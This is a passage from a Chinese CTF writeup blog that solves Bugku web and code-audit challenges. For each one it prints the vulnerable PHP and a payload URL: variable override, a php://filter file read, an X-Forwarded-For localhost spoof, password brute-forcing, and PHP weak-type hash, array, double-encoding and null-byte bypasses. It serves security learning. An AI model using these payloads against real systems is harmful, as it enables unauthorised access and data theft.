\w包含[a-z,A-Z,,0-9]中的字符，+代表可以有一个或多个;<br><strong>理解2</strong>：$$args表示的是以$args为变量名的变量;<br><strong>理解3</strong>：$GLOBALS[]包含正在执行脚本所有超级全局变量的引用内容;<br>开头就提示flag在变量里，所以只要看看变量里都放了些什么就可以了，args=GLOABLS就可以将$$args解析成$GLOBALS,var_dump打印变量的相关信息<br>这样就可以显示出所有变量的内容<br><img src="https://s1.ax1x.com/2018/12/01/FnJjGq.png" alt=""><br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:8004/index1.php?args=GLOBALS</span><br></pre></td></tr></table></figure></p><h2 id="Web5"><a href="#Web5" class="headerlink" title="Web5"></a>Web5</h2><p>提示是jspfuck，查看源代码，复制下来放到google控制台跑一下<br><img src="https://s1.ax1x.com/2018/12/01/FnYWmF.png" alt=""><br>发现了ctf{whatfk}，提交提示离答案非常接近，要求是CTF头，所以全部大写提交，成功…</p><h2 id="头等舱"><a href="#头等舱" class="headerlink" title="头等舱"></a>头等舱</h2><p>打开发现什么都没有…查看源代码也没有什么东西，F12查看一波也没有什么发现，无奈之下用bp截取之后运行…以为有点难，没想到是水题…<br><img src="https://s1.ax1x.com/2018/12/01/FntDBD.png" alt=""></p><h2 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h2><p>嗯，挺漂亮的网页，查看半天也没发现什么奇怪的东西，就扫一波后台目录<br><img src="https://s1.ax1x.com/2018/12/01/FndK54.png" alt=""><br>发现了index.php和shell.php，打开shell.php如图：<br><img src="https://s1.ax1x.com/2018/12/01/FndlG9.png" alt=""><br>发现需要输入密码，bp抓一波，然后选择passwords字典暴力破解<br><img src="https://s1.ax1x.com/2018/12/01/Fn6vKH.png" alt=""><br>降序排列一波发现1110匹配项<br><img src="https://s1.ax1x.com/2018/12/01/Fnc9at.png" alt=""></p><h2 id="管理员系统"><a href="#管理员系统" class="headerlink" title="管理员系统"></a>管理员系统</h2><p>这题不太会，找到源码中的base64编码<br><img src="https://s1.ax1x.com/2018/12/01/Fn2QvF.png" alt=""><br>解码以后是test123，输入admin为用户名，test123为密码，发现不能访问，IP禁止访问，请联系本地管理员登录，也就是说需要本地登录才可以进去，所以就尝试着bp抓一波包，从大佬的wp中了解到这题需要<strong>伪装成本地访问</strong>才可以通过，伪装本地访问的方法就是在headers里面添加如下http头：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:127.0.0.1</span><br></pre></td></tr></table></figure></p><p><img src="https://s1.ax1x.com/2018/12/01/Fn2c5t.png" alt=""><br>弹出flag：<br><img src="https://s1.ax1x.com/2018/12/01/Fn2Ibj.png" alt=""></p><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>提示查看源码就查看一波源码，发现一大串url编码：<br><img src="https://s1.ax1x.com/2018/12/01/Fn2TVs.png" alt=""><br>解码后：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> checkSubmit()</span><br><span class="line">&#123;</span><br><span class="line">var a=document.getElementById(<span class="string">"password"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="string">"undefined"</span>!=typeof a)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="string">"67d709b2b54aa2aa648cf6e87a7114f1"</span>==a.value)</span><br><span class="line"><span class="built_in">return</span>!0;</span><br><span class="line">alert(<span class="string">"Error"</span>);</span><br><span class="line">a.focus();</span><br><span class="line"><span class="built_in">return</span>!1</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">document.getElementById(<span class="string">"levelQuest"</span>).onsubmit=checkSubmit;</span><br></pre></td></tr></table></figure></p><p>将67d709b2b54aa2aa648cf6e87a7114f1这一串数字提交到表单里直接出flag…(什么鬼玩意儿)<br><img src="https://s1.ax1x.com/2018/12/01/FnRpZ9.png" alt=""></p><h2 id="flag在index里"><a href="#flag在index里" class="headerlink" title="flag在index里"></a>flag在index里</h2><p>文件包含题，和nctf的文件包含如出一辙；<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure></p><p>解析为base64编码，解码后发现flag</p><h2 id="输入密码查看flag"><a href="#输入密码查看flag" class="headerlink" title="输入密码查看flag"></a>输入密码查看flag</h2><p>进去发现需要输入5位密码,就直接用burp爆破一下，先设置五位数字爆破<br><img src="https://s1.ax1x.com/2018/12/02/FKk4JJ.png" alt=""><br>等一下发现出现length不一样的项目，直接找到了flag<br><img src="https://s1.ax1x.com/2018/12/02/FKk5W9.png" alt=""></p><h2 id="点击一百万次"><a href="#点击一百万次" class="headerlink" title="点击一百万次"></a>点击一百万次</h2><p>这题你点一下鼠标数值就会加一，<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    var clicks=0</span><br><span class="line">    $(<span class="function"><span class="title">function</span></span>() &#123;</span><br><span class="line">      $(<span class="string">"#cookie"</span>)</span><br><span class="line">        .mousedown(<span class="function"><span class="title">function</span></span>() &#123;</span><br><span class="line">          $(this).width(<span class="string">'350px'</span>).height(<span class="string">'350px'</span>);</span><br><span class="line">        &#125;)</span><br><span class="line">        .mouseup(<span class="function"><span class="title">function</span></span>() &#123;</span><br><span class="line">          $(this).width(<span class="string">'375px'</span>).height(<span class="string">'375px'</span>);</span><br><span class="line">          clicks++;</span><br><span class="line">          $(<span class="string">"#clickcount"</span>).text(clicks);</span><br><span class="line">          <span class="keyword">if</span>(clicks &gt;= 1000000)&#123;</span><br><span class="line">          var form = $(<span class="string">'&lt;form action="" method="post"&gt;'</span> +</span><br><span class="line"><span class="string">'&lt;input type="text" name="clicks" value="'</span> + clicks + <span class="string">'" hidden/&gt;'</span> +</span><br><span class="line"><span class="string">'&lt;/form&gt;'</span>);</span><br><span class="line">$(<span class="string">'body'</span>).append(form);</span><br><span class="line">form.submit();</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>查看源代码发现只要点击鼠标就会clicks++，method是POST，所以可以直接post一个clicks=1000000过去就可以了<br><img src="https://s1.ax1x.com/2018/12/02/FKAuyq.png" alt=""><br>得到flag<br><img src="https://s1.ax1x.com/2018/12/02/FKAlwT.png" alt=""></p><h2 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h2><p>提示备份直接进入index.php.bak,发现如下,是一个弱类型的MD5绕过，构造MD5值为0e开头的值就可以了<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * User: Norse</span><br><span class="line"> * Date: 2017/8/6</span><br><span class="line"> * Time: 20:22</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">include_once <span class="string">"flag.php"</span>;</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, 0);</span><br><span class="line"><span class="variable">$str</span> = strstr(<span class="variable">$_SERVER</span>[<span class="string">'REQUEST_URI'</span>], <span class="string">'?'</span>);</span><br><span class="line"><span class="variable">$str</span> = substr(<span class="variable">$str</span>,1);//返回从1到后面的字符</span><br><span class="line"><span class="variable">$str</span> = str_replace(<span class="string">'key'</span>,<span class="string">''</span>,<span class="variable">$str</span>);//key替换为<span class="string">''</span></span><br><span class="line">parse_str(<span class="variable">$str</span>);//字符串解析到变量</span><br><span class="line"><span class="built_in">echo</span> md5(<span class="variable">$key1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> md5(<span class="variable">$key2</span>);</span><br><span class="line"><span class="keyword">if</span>(md5(<span class="variable">$key1</span>) == md5(<span class="variable">$key2</span>) &amp;&amp; <span class="variable">$key1</span> !== <span class="variable">$key2</span>)&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$flag</span>.<span class="string">"取得flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>去掉第一个字符后，用’’替换key，也就是直接去掉key，然后字符串解析到变量，构造payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:8002/web16/?kekeyy1=s878926199a&amp;kekeyy2=QNKCDZO</span><br></pre></td></tr></table></figure></p><hr><p>持续更新…</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;菜狗就要多刷题…
    
    </summary>
    
      <category term="Writeup" scheme="https://gardenia30.top/categories/Writeup/"/>
    
    
      <category term="CTF" scheme="https://gardenia30.top/tags/CTF/"/>
    
      <category term="Writeup" scheme="https://gardenia30.top/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>BugkuCTF代码审计Writeup</title>
    <link href="https://gardenia30.top/2018/11/30/BugkuCTF%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1writeup/"/>
    <id>https://gardenia30.top/2018/11/30/BugkuCTF代码审计writeup/</id>
    <published>2018-11-30T11:55:02.000Z</published>
    <updated>2018-12-22T11:33:16.376Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在读吴翰清先生的《白帽子讲Web安全》<a id="more"></a>，可以说是菜狗打开了自己新世界的大门，像是那种在乡下待了几十年的无知少年突然到了一个大城市的那种感觉，虽然有些东西现在还是不能完全参悟，但是感觉自己正在慢慢了解了这个领域而且兴趣比以前多了许多，有了一种想学下去的欲望，自己在大一大二并没有找对自己的定位，浑浑噩噩不知道干了些什么，代码能力很弱，导致现在代码审计类题目菜的一批，所以还是要脚踏实地，从最基础的地方开始学习，心无旁骛忘记烦恼，既然找到了想学习的东西，就认真下去吧，fight！<br>看了白帽子的PHP安全这一块内容，决定上手一些题目练一练基础，下面放上一些晚上练习的Bugku的代码审计题目(嗓子疼的感觉真tm是这辈子最难受的了)</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="extract变量覆盖"><a href="#extract变量覆盖" class="headerlink" title="extract变量覆盖"></a>extract变量覆盖</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$flag</span>=<span class="string">'xxx'</span>;</span><br><span class="line">extract(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$shiyan</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$content</span>=trim(file_get_contents(<span class="variable">$flag</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$shiyan</span>==<span class="variable">$content</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">echo</span><span class="string">'flag&#123;xxx&#125;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">echo</span><span class="string">'Oh.no'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>和南邮的变量覆盖没什么区别，shiyan和flag作为键名传值；<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:9009/1.php?shiyan=&amp;flag=</span><br></pre></td></tr></table></figure></p><h2 id="strcmp比较字符串"><a href="#strcmp比较字符串" class="headerlink" title="strcmp比较字符串"></a>strcmp比较字符串</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">"flag&#123;xxxxx&#125;"</span>;</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">'a'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (strcmp(<span class="variable">$_GET</span>[<span class="string">'a'</span>], <span class="variable">$flag</span>) == 0) //如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。</span><br><span class="line">//比较两个字符串（区分大小写）</span><br><span class="line">die(<span class="string">'Flag: '</span>.<span class="variable">$flag</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">'No'</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>看见<strong>==</strong>大概率就是弱类型绕过了，strcmp函数是不能处理数组的，直接构造一个数组就可以返回null==0<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:9009/6.php?a[]=1</span><br></pre></td></tr></table></figure></p><h2 id="urldecode二次编码绕过"><a href="#urldecode二次编码绕过" class="headerlink" title="urldecode二次编码绕过"></a>urldecode二次编码绕过</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span>(eregi(<span class="string">"hackerDJ"</span>,<span class="variable">$_GET</span>[id])) </span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">echo</span>(<span class="string">"not allowed!"</span>);</span><br><span class="line"><span class="built_in">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$_GET</span>[id] = urldecode(<span class="variable">$_GET</span>[id]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">"hackerDJ"</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Access granted!"</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>eregi()函数规定id中不能包含<strong>hackerDJ</strong>，直接将hackerDJ用url编码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%68%61%63%6B%65%72%44%4A</span><br></pre></td></tr></table></figure></p><p>放进去还是一样，问了一下度娘发现url在$get 进行传参的时候一般都进行了一次解码，所以上面的url编码实际上已经被解码了，直接就弹出了<strong>“not allowed!”</strong>于是将得到的url编码进行二次编码即可:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%2568%2561%2563%256B%2565%2572%2544%254A</span><br></pre></td></tr></table></figure></p><p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:9009/10.php?id=%2568%2561%2563%256B%2565%2572%2544%254A</span><br></pre></td></tr></table></figure></p><h2 id="md5-函数"><a href="#md5-函数" class="headerlink" title="md5()函数"></a>md5()函数</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">'flag&#123;test&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">'username'</span>]) and isset(<span class="variable">$_GET</span>[<span class="string">'password'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">'username'</span>] == <span class="variable">$_GET</span>[<span class="string">'password'</span>])</span><br><span class="line"><span class="built_in">print</span> <span class="string">'Your password can not be your username.'</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (md5(<span class="variable">$_GET</span>[<span class="string">'username'</span>]) === md5(<span class="variable">$_GET</span>[<span class="string">'password'</span>]))</span><br><span class="line">die(<span class="string">'Flag: '</span>.<span class="variable">$flag</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">'Invalid password'</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>同样md5函数也是不可以处理数组的，而且username!=password，<strong>===</strong>是强类型，需要完全一样，类型也必须一样，所以两个null===null，完美….<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:9009/18.php?username[]=1&amp;password[]=2</span><br></pre></td></tr></table></figure></p><h2 id="md5加密相等绕过"><a href="#md5加密相等绕过" class="headerlink" title="md5加密相等绕过"></a>md5加密相等绕过</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$md51</span> = md5(<span class="string">'QNKCDZO'</span>);</span><br><span class="line"><span class="variable">$a</span> = @<span class="variable">$_GET</span>[<span class="string">'a'</span>];</span><br><span class="line"><span class="variable">$md52</span> = @md5(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$a</span>))&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span> != <span class="string">'QNKCDZO'</span> &amp;&amp; <span class="variable">$md51</span> == <span class="variable">$md52</span>) &#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"flag&#123;*&#125;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"false!!!"</span>;</span><br><span class="line">&#125;&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;<span class="built_in">echo</span> <span class="string">"please input a"</span>;&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>老题，<strong>==</strong>弱类型绕过，<strong>QNKCDZO</strong>的MD5值是<strong>0e</strong>开头解析为0，所以直接找一个a让他的MD5值也为0e开头就好<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:9009/13.php?a=s878926199a</span><br></pre></td></tr></table></figure></p><h2 id="数组返回NULL绕过"><a href="#数组返回NULL绕过" class="headerlink" title="数组返回NULL绕过"></a>数组返回NULL绕过</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">"flag"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (isset (<span class="variable">$_GET</span>[<span class="string">'password'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, <span class="variable">$_GET</span>[<span class="string">'password'</span>]) === FALSE)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'You password must be alphanumeric'</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (strpos (<span class="variable">$_GET</span>[<span class="string">'password'</span>], <span class="string">'--'</span>) !== FALSE)</span><br><span class="line">die(<span class="string">'Flag: '</span> . <span class="variable">$flag</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'Invalid password'</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>题目要求password中只能出现大小写字母和数字，还必须要出现*–*而且还不是弱类型<strong>!==</strong><br>方法1：strop函数同样也是不能处理数组的直接构造一个数组返回null!==FALSE即可<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:9009/19.php?password[]=1</span><br></pre></td></tr></table></figure></p><p>方法2：构造%00截断，ereg函数只能处理到00之前的字符<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:9009/19.php?password=1%00*--*</span><br></pre></td></tr></table></figure></p><h2 id="弱类型整数大小比较绕过"><a href="#弱类型整数大小比较绕过" class="headerlink" title="弱类型整数大小比较绕过"></a>弱类型整数大小比较绕过</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$temp</span> = <span class="variable">$_GET</span>[<span class="string">'password'</span>];</span><br><span class="line">is_numeric(<span class="variable">$temp</span>)?die(<span class="string">"no numeric"</span>):NULL;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$temp</span>&gt;1336)&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure><p><strong>is_numeric</strong>要求不能是数字，而且要大于1336，用%00跟在数字后会判断为非数字<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:9009/22.php?password=1337%00</span><br></pre></td></tr></table></figure></p><p>这题很奇怪，我用数组试了一下，也是可以的，搞不懂…</p><h2 id="sha-函数比较绕过"><a href="#sha-函数比较绕过" class="headerlink" title="sha()函数比较绕过"></a>sha()函数比较绕过</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">"flag"</span>;</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">'name'</span>]) and isset(<span class="variable">$_GET</span>[<span class="string">'password'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">var_dump(<span class="variable">$_GET</span>[<span class="string">'name'</span>]);</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"</span></span><br><span class="line"><span class="string">"</span>;</span><br><span class="line">var_dump(<span class="variable">$_GET</span>[<span class="string">'password'</span>]);</span><br><span class="line">var_dump(sha1(<span class="variable">$_GET</span>[<span class="string">'name'</span>]));</span><br><span class="line">var_dump(sha1(<span class="variable">$_GET</span>[<span class="string">'password'</span>]));</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">'name'</span>] == <span class="variable">$_GET</span>[<span class="string">'password'</span>])</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Your password can not be your name!</span></span><br><span class="line"><span class="string">'</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (sha1(<span class="variable">$_GET</span>[<span class="string">'name'</span>]) === sha1(<span class="variable">$_GET</span>[<span class="string">'password'</span>]))</span><br><span class="line">die(<span class="string">'Flag: '</span>.<span class="variable">$flag</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Invalid password.</span></span><br><span class="line"><span class="string">'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Login first!</span></span><br><span class="line"><span class="string">'</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>sha1函数同样不能处理数组，直接构造两个不相等的数组传进去即可构造<strong>null===null</strong><br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:9009/7.php?name[]=1&amp;password[]=2</span><br></pre></td></tr></table></figure></p><h2 id="十六进制与数字比较"><a href="#十六进制与数字比较" class="headerlink" title="十六进制与数字比较"></a>十六进制与数字比较</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"><span class="keyword">function</span> noother_says_correct(<span class="variable">$temp</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">'flag&#123;test&#125;'</span>;</span><br><span class="line"><span class="variable">$one</span> = ord(<span class="string">'1'</span>); //ord — 返回字符的 ASCII 码值</span><br><span class="line"><span class="variable">$nine</span> = ord(<span class="string">'9'</span>); //ord — 返回字符的 ASCII 码值</span><br><span class="line"><span class="variable">$number</span> = <span class="string">'3735929054'</span>;</span><br><span class="line">// Check all the input characters!</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; strlen(<span class="variable">$number</span>); <span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line">// Disallow all the digits!</span><br><span class="line"><span class="variable">$digit</span> = ord(<span class="variable">$temp</span>&#123;<span class="variable">$i</span>&#125;);</span><br><span class="line"><span class="keyword">if</span> ( (<span class="variable">$digit</span> &gt;= <span class="variable">$one</span>) &amp;&amp; (<span class="variable">$digit</span> &lt;= <span class="variable">$nine</span>) )</span><br><span class="line">&#123;</span><br><span class="line">// Aha, digit not allowed!</span><br><span class="line"><span class="built_in">return</span> <span class="string">"flase"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$number</span> == <span class="variable">$temp</span>)</span><br><span 